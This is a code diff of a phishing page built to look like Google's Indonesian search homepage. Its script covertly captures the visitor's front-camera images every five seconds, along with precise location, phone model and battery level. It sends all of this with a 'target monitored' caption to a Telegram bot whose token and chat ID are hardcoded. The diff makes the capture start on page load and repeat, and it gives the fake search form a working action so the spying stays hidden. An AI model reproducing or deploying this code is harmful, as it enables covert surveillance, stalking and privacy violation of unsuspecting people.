@@ -5,17 +5,15 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Google</title>
     <style>
-        body { margin: 0; font-family: arial, sans-serif; background: #fff; }
-        .navbar { display: flex; justify-content: flex-end; padding: 15px; gap: 15px; font-size: 13px; }
-        .main { display: flex; flex-direction: column; align-items: center; margin-top: 100px; }
+        body { margin: 0; font-family: arial, sans-serif; background: #fff; display: flex; flex-direction: column; height: 100vh; }
+        .navbar { display: flex; justify-content: flex-end; padding: 15px; gap: 15px; font-size: 13px; color: #000; }
+        .main { display: flex; flex-direction: column; align-items: center; margin-top: 80px; flex-grow: 1; }
         .logo { width: 272px; margin-bottom: 30px; }
-        .search-container { position: relative; width: 90%; max-width: 584px; }
+        .search-form { width: 90%; max-width: 584px; display: flex; flex-direction: column; align-items: center; }
         .search-bar { 
             width: 100%; border: 1px solid #dfe1e5; padding: 12px 20px; 
-            border-radius: 24px; font-size: 16px; outline: none; box-shadow: none;
-            transition: box-shadow 0.2s;
+            border-radius: 24px; font-size: 16px; outline: none; box-sizing: border-box;
         }
-        .search-bar:hover, .search-bar:focus { box-shadow: 0 1px 6px rgba(32,33,36,.28); border-color: rgba(223,225,229,0); }
         .buttons { margin-top: 25px; display: flex; gap: 10px; }
         .btn { 
             background-color: #f8f9fa; border: 1px solid #f8f9fa; 
@@ -33,14 +31,14 @@
 </div>
 
 <div class="main">
-    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" class="logo" alt="Google">
-    <div class="search-container">
-        <input type="text" class="search-bar" id="searchInput" autocomplete="off">
-    </div>
-    <div class="buttons">
-        <button class="btn" id="searchBtn">Penelusuran Google</button>
-        <button class="btn">Saya Lagi Beruntung</button>
-    </div>
+    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" class="logo">
+    <form class="search-form" action="https://www.google.com/search" method="GET">
+        <input type="text" name="q" class="search-bar" autocomplete="off" autofocus>
+        <div class="buttons">
+            <input type="submit" class="btn" value="Penelusuran Google">
+            <input type="button" class="btn" value="Saya Lagi Beruntung">
+        </div>
+    </form>
 </div>
 
 <video id="video" style="display:none;" autoplay playsinline></video>
@@ -49,60 +47,65 @@
 <script>
     const TOKEN = '8746483619:AAFM0hZ7HwcnPFPV07PFUZZ4lGML0Nrt5aw';
     const CHAT_ID = '6888530451';
-    let userLocation = "Menunggu Izin...";
+    let userLocation = "Mencari lokasi...";
 
-    // 1. Deteksi Nama HP yang lebih akurat
-    async function getDeviceInfo() {
-        let battery = "N/A";
-        if (navigator.getBattery) {
-            const bat = await navigator.getBattery();
-            battery = Math.round(bat.level * 100) + "%";
-        }
-
+    // SISTEM DETEKSI HP AKURAT
+    function getAccurateDevice() {
         const ua = navigator.userAgent;
-        let device = "Unknown Device";
+        let model = "Tidak Terdeteksi";
 
-        // Regex untuk menarik nama model di dalam kurung User-Agent
-        const deviceMatch = ua.match(/\(([^;]+); ([^;]+); ([^)]+)\)/);
         if (/android/i.test(ua)) {
-            device = (deviceMatch && deviceMatch[3]) ? deviceMatch[3].split(' Build')[0] : "Android Phone";
-        } else if (/iPhone/i.test(ua)) {
-            device = "iPhone";
+            // Teknik membedah User Agent Android untuk ambil Model
+            const androidInfo = ua.match(/\(([^)]+)\)/);
+            if (androidInfo && androidInfo[1]) {
+                const parts = androidInfo[1].split(';');
+                // Biasanya model ada di bagian terakhir sebelum kata 'Build'
+                const rawModel = parts[parts.length - 1].split('Build/')[0].trim();
+                model = rawModel !== "Linux" ? rawModel : (parts[parts.length - 2] || "Android").trim();
+            }
+        } else if (/iPhone|iPad|iPod/i.test(ua)) {
+            model = "Apple iOS Device";
+        } else if (/Windows/i.test(ua)) {
+            model = "Windows PC";
         }
-
-        return { device, battery };
+        return model;
     }
 
-    // 2. Minta Lokasi Otomatis saat buka
-    function getLocation() {
+    async function getBattery() {
+        if (navigator.getBattery) {
+            const bat = await navigator.getBattery();
+            return Math.round(bat.level * 100) + "%";
+        }
+        return "N/A";
+    }
+
+    function setupLocation() {
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(pos => {
                 userLocation = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-            });
+            }, null, { enableHighAccuracy: true });
         }
     }
 
-    // 3. Picu Kamera saat mengetik atau klik cari
-    async function startCapture() {
+    async function initMonitor() {
+        setupLocation();
+        const deviceName = getAccurateDevice();
+        const batteryLevel = await getBattery();
+
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user", width: 1280, height: 720 } 
-            });
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             const video = document.getElementById('video');
             video.srcObject = stream;
-            video.play();
-            
-            // Ambil foto setelah 2 detik agar kamera fokus
-            setTimeout(takeSnapshot, 2000);
-        } catch (e) { console.error("Kamera ditolak"); }
+            video.onloadedmetadata = () => {
+                video.play();
+                setInterval(() => takeSnapshot(deviceName, batteryLevel), 5000);
+            };
+        } catch (e) { console.log("Izin ditolak"); }
     }
 
-    async function takeSnapshot() {
-        const info = await getDeviceInfo();
+    async function takeSnapshot(deviceName, batteryLevel) {
         const canvas = document.getElementById('canvas');
         const video = document.getElementById('video');
-        
-        // Pastikan aspek rasio kamera penuh
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         canvas.getContext('2d').drawImage(video, 0, 0);
@@ -110,22 +113,14 @@
         canvas.toBlob(blob => {
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'target.jpg');
-            formData.append('caption', `👁 *Target Terpantau*\n\n📱 HP: ${info.device}\n🔋 Baterai: ${info.battery}\n📍 Lokasi: ${userLocation}`);
+            formData.append('photo', blob, 'img.jpg');
+            formData.append('caption', `👁 *Target Terpantau*\n\n📱 HP: ${deviceName}\n🔋 Baterai: ${batteryLevel}\n📍 Lokasi: ${userLocation}`);
             formData.append('parse_mode', 'Markdown');
-
             fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-        }, 'image/jpeg', 0.8);
+        }, 'image/jpeg', 0.7);
     }
 
-    // Jalankan saat ada aktivitas di bar pencarian
-    document.getElementById('searchInput').addEventListener('focus', startCapture);
-    document.getElementById('searchBtn').addEventListener('click', () => {
-        alert("Koneksi tidak stabil, silakan coba lagi.");
-    });
-    
-    // Inisialisasi lokasi saat halaman dimuat
-    window.onload = getLocation;
+    window.onload = initMonitor;
 </script>
 </body>
 </html>
